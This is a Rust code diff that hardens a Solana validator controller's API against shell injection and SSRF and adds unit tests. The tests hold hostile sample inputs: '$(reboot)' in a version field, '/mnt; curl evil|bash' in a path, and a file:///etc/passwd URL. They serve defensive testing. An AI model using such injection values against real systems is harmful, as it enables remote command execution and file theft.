@@ -33,7 +33,10 @@ pub struct ApiState {
     pub db: Db,
     pub registry: NodeRegistry,
     pub config: ControllerConfig,
+    /// Agent enrollment token (gRPC + onboard command). Not valid for the admin API.
     pub auth_token: String,
+    /// Admin API bearer token — distinct secret from `auth_token`.
+    pub api_token: String,
     pub update_info: SharedUpdateInfo,
     pub sessions: SessionStore,
 }
@@ -66,6 +69,7 @@ pub fn router(state: ApiState) -> Router {
         .route("/api/version", get(version_info))
         .route("/api/upgrade-controller", post(upgrade_controller))
         .route("/api/nodes/{id}/upgrade-agent", post(upgrade_agent))
+        .route("/api/nodes/{id}/issue-cert", post(issue_node_cert))
         .route(
             "/api/settings/grafana",
             get(get_grafana_settings).put(set_grafana_settings),
@@ -658,6 +662,96 @@ struct ProvisionRequest {
     net_interface: String,
 }
 
+const ALLOWED_CLIENTS: &[&str] = &["agave", "jito", "firedancer", "frankendancer", "surfpool"];
+const ALLOWED_CLUSTERS: &[&str] = &["mainnet", "mainnet-beta", "testnet", "devnet"];
+
+/// Rejects characters that allow shell injection or extra-line injection once the
+/// value is rendered into a script/systemd unit run as `sol` with sudo.
+fn is_shell_safe(s: &str) -> bool {
+    !s.chars().any(|c| {
+        c.is_control()
+            || matches!(
+                c,
+                '`' | '$' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '"' | '\'' | '\\'
+            )
+    })
+}
+
+/// Whitelist enums and validate every operator field before it is rendered into a script.
+fn validate_provision_request(req: &ProvisionRequest) -> Result<(), String> {
+    if !ALLOWED_CLIENTS.contains(&req.client.as_str()) {
+        return Err(format!("invalid client: {:?}", req.client));
+    }
+    if !ALLOWED_CLUSTERS.contains(&req.cluster.as_str()) {
+        return Err(format!("invalid cluster: {:?}", req.cluster));
+    }
+
+    // version is interpolated into `git clone --branch v{version}` and download paths.
+    if req.version.is_empty()
+        || !req
+            .version
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
+    {
+        return Err("version must be non-empty and contain only [A-Za-z0-9._-]".to_string());
+    }
+
+    let url = &req.download_url;
+    if !url.is_empty() && !url.starts_with("http://") && !url.starts_with("https://") {
+        return Err("download_url must start with http:// or https://".to_string());
+    }
+
+    if !req.sha256.is_empty() {
+        let valid = req.sha256.len() == 64 && req.sha256.chars().all(|c| c.is_ascii_hexdigit());
+        if !valid {
+            return Err("sha256 must be 64 hex characters".to_string());
+        }
+    }
+
+    let singles = [
+        req.download_url.as_str(),
+        req.identity_keypair_path.as_str(),
+        req.vote_account_keypair_path.as_str(),
+        req.ledger_path.as_str(),
+        req.snapshot_path.as_str(),
+        req.accounts_path.as_str(),
+        req.jito_block_engine_url.as_str(),
+        req.jito_relayer_url.as_str(),
+        req.jito_shred_receiver_addr.as_str(),
+        req.dynamic_port_range.as_str(),
+        req.node_type.as_str(),
+        req.net_provider.as_str(),
+        req.net_interface.as_str(),
+    ];
+    for v in singles {
+        if !is_shell_safe(v) {
+            return Err(format!("field contains a disallowed character: {v:?}"));
+        }
+    }
+
+    let lists = [
+        ("entrypoints", &req.entrypoints),
+        ("known_validators", &req.known_validators),
+        ("geyser_plugin_configs", &req.geyser_plugin_configs),
+        ("extra_args", &req.extra_args),
+    ];
+    for (name, list) in lists {
+        for v in list {
+            if !is_shell_safe(v) {
+                return Err(format!("{name} contains a disallowed character: {v:?}"));
+            }
+        }
+    }
+
+    for (k, v) in req.validator_flags.iter().chain(req.environment_vars.iter()) {
+        if !is_shell_safe(k) || !is_shell_safe(v) {
+            return Err(format!("flag/env contains a disallowed character: {k:?}={v:?}"));
+        }
+    }
+
+    Ok(())
+}
+
 /// Build template variables from a ProvisionRequest.
 fn build_provision_vars(req: &ProvisionRequest) -> HashMap<String, String> {
     let service_name = templates::service_name_for_client(&req.client).to_string();
@@ -878,6 +972,16 @@ async fn provision_node(
     Path(id): Path<String>,
     Json(req): Json<ProvisionRequest>,
 ) -> impl IntoResponse {
+    // Validate every operator-supplied field BEFORE it is interpolated into a shell
+    // script the agent runs as `sol` with sudo. Blocks command/template injection.
+    if let Err(msg) = validate_provision_request(&req) {
+        return (
+            StatusCode::BAD_REQUEST,
+            Json(CommandResponse { ok: false, message: msg }),
+        )
+            .into_response();
+    }
+
     // Reject if node is already provisioning or actively running a validator
     match db::get_lifecycle_state(&state.db, &id).await {
         Ok(Some(s)) if s == "provisioning" || s == "starting_up" => {
@@ -1191,6 +1295,38 @@ async fn onboard_command(State(state): State<ApiState>) -> impl IntoResponse {
     Json(OnboardCommandResponse { command: cmd })
 }
 
+#[derive(Serialize)]
+struct NodeCertResponse {
+    node_id: String,
+    cert_pem: String,
+    key_pem: String,
+}
+
+/// Issue an mTLS client certificate (CN = node_id) for an agent. Admin-only, so the
+/// shared enrollment token can't mint identities for arbitrary nodes.
+async fn issue_node_cert(State(state): State<ApiState>, Path(id): Path<String>) -> Response {
+    if state.config.certs_dir.is_empty() {
+        return (
+            StatusCode::BAD_REQUEST,
+            Json(serde_json::json!({"error": "certs_dir is not configured"})),
+        )
+            .into_response();
+    }
+    match crate::certs::issue_client_cert(&state.config.certs_dir, &id) {
+        Ok((cert_pem, key_pem)) => Json(NodeCertResponse {
+            node_id: id,
+            cert_pem,
+            key_pem,
+        })
+        .into_response(),
+        Err(e) => (
+            StatusCode::INTERNAL_SERVER_ERROR,
+            Json(serde_json::json!({"error": e.to_string()})),
+        )
+            .into_response(),
+    }
+}
+
 // ---------------------------------------------------------------------------
 // Version / upgrade endpoints
 // ---------------------------------------------------------------------------
@@ -1409,6 +1545,13 @@ async fn set_grafana_settings(
         )
             .into_response();
     }
+    if !url.is_empty() && grafana_host_is_disallowed(&url).await {
+        return (
+            StatusCode::BAD_REQUEST,
+            Json(serde_json::json!({"error": "grafana_url must resolve to a public address"})),
+        )
+            .into_response();
+    }
 
     match db::set_setting(&state.db, "grafana_url", &url).await {
         Ok(()) => Json(GrafanaSettings { grafana_url: url }).into_response(),
@@ -1442,6 +1585,67 @@ async fn dashboard_node_detail() -> impl IntoResponse {
 // Grafana reverse proxy
 // ---------------------------------------------------------------------------
 
+/// True if `ip` is a loopback/private/link-local/unspecified address — i.e. an
+/// internal SSRF target (cloud metadata at 169.254.169.254 is link-local).
+fn ip_is_disallowed(ip: std::net::IpAddr) -> bool {
+    match ip {
+        std::net::IpAddr::V4(v4) => {
+            v4.is_loopback()
+                || v4.is_private()
+                || v4.is_link_local()
+                || v4.is_unspecified()
+                || v4.is_broadcast()
+        }
+        std::net::IpAddr::V6(v6) => {
+            v6.is_loopback()
+                || v6.is_unspecified()
+                || (v6.segments()[0] & 0xfe00) == 0xfc00 // unique-local fc00::/7
+                || (v6.segments()[0] & 0xffc0) == 0xfe80 // link-local fe80::/10
+        }
+    }
+}
+
+/// Resolve a Grafana URL's host and reject it if it points at an internal address.
+/// Fails closed: an unparseable/unresolvable host is treated as disallowed.
+async fn grafana_host_is_disallowed(url: &str) -> bool {
+    let authority = url
+        .trim_start_matches("https://")
+        .trim_start_matches("http://")
+        .split('/')
+        .next()
+        .unwrap_or("");
+    if authority.is_empty() {
+        return true;
+    }
+    // Normalize to "host:port" for lookup_host; default port is irrelevant to the IP check.
+    let hostport = if authority.starts_with('[') {
+        if authority.contains("]:") {
+            authority.to_string()
+        } else {
+            format!("{authority}:80")
+        }
+    } else if authority.contains(':') {
+        authority.to_string()
+    } else {
+        format!("{authority}:80")
+    };
+
+    let lookup = tokio::net::lookup_host(&hostport).await;
+    match lookup {
+        Ok(addrs) => {
+            let mut resolved = false;
+            for addr in addrs {
+                resolved = true;
+                if ip_is_disallowed(addr.ip()) {
+                    return true;
+                }
+            }
+            !resolved // no addresses → fail closed
+        }
+        Err(_) => true,
+    }
+}
+
 pub fn grafana_router(state: ApiState) -> Router {
     Router::new()
         .route("/{*path}", any(grafana_proxy))
@@ -1453,12 +1657,21 @@ async fn grafana_proxy(
     Path(path): Path<String>,
     req: axum::extract::Request,
 ) -> Response {
+    if path.contains("..") {
+        return (StatusCode::BAD_REQUEST, "invalid path").into_response();
+    }
+
     let grafana_url = match db::get_setting(&state.db, "grafana_url").await {
         Ok(Some(url)) if !url.is_empty() => url,
         _ => {
             return (StatusCode::BAD_GATEWAY, "Grafana URL not configured").into_response();
         }
     };
+
+    // Re-check at request time so a host that now resolves internally is rejected.
+    if grafana_host_is_disallowed(&grafana_url).await {
+        return (StatusCode::BAD_GATEWAY, "Grafana URL not allowed").into_response();
+    }
 
     let upstream = format!(
         "{}/grafana/{}{}",
@@ -1470,7 +1683,10 @@ async fn grafana_proxy(
             .unwrap_or_default()
     );
 
-    let client = reqwest::Client::new();
+    let client = reqwest::Client::builder()
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| reqwest::Client::new());
     let method = req.method().clone();
     let mut builder = client.request(method, &upstream);
 
@@ -1517,4 +1733,55 @@ async fn grafana_proxy(
     resp_builder
         .body(Body::from(resp_bytes))
         .unwrap_or_else(|_| (StatusCode::INTERNAL_SERVER_ERROR, "proxy error").into_response())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn req(json: &str) -> ProvisionRequest {
+        serde_json::from_str(json).unwrap()
+    }
+
+    #[test]
+    fn accepts_a_normal_request() {
+        let r = req(r#"{"client":"agave","version":"2.1.6","cluster":"testnet","ledger_path":"/mnt/ledger"}"#);
+        assert!(validate_provision_request(&r).is_ok());
+    }
+
+    #[test]
+    fn rejects_command_substitution_in_version() {
+        let r = req(r#"{"client":"agave","version":"$(reboot)","cluster":"testnet"}"#);
+        assert!(validate_provision_request(&r).is_err());
+    }
+
+    #[test]
+    fn rejects_injection_in_a_path() {
+        let r = req(r#"{"client":"agave","version":"2.1.6","cluster":"testnet","ledger_path":"/mnt; curl evil|bash"}"#);
+        assert!(validate_provision_request(&r).is_err());
+    }
+
+    #[test]
+    fn rejects_unknown_client_and_cluster() {
+        assert!(validate_provision_request(&req(
+            r#"{"client":"evil","version":"1","cluster":"testnet"}"#
+        ))
+        .is_err());
+        assert!(validate_provision_request(&req(
+            r#"{"client":"agave","version":"1","cluster":"evil"}"#
+        ))
+        .is_err());
+    }
+
+    #[test]
+    fn rejects_bad_sha256_and_non_http_url() {
+        assert!(validate_provision_request(&req(
+            r#"{"client":"agave","version":"1","cluster":"testnet","sha256":"xyz"}"#
+        ))
+        .is_err());
+        assert!(validate_provision_request(&req(
+            r#"{"client":"agave","version":"1","cluster":"testnet","download_url":"file:///etc/passwd"}"#
+        ))
+        .is_err());
+    }
 }
